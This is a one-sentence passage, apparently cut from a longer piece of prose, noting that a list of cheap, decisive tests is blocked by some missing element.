substantial list of cheap, decisive tests is blocked on that absence alone.
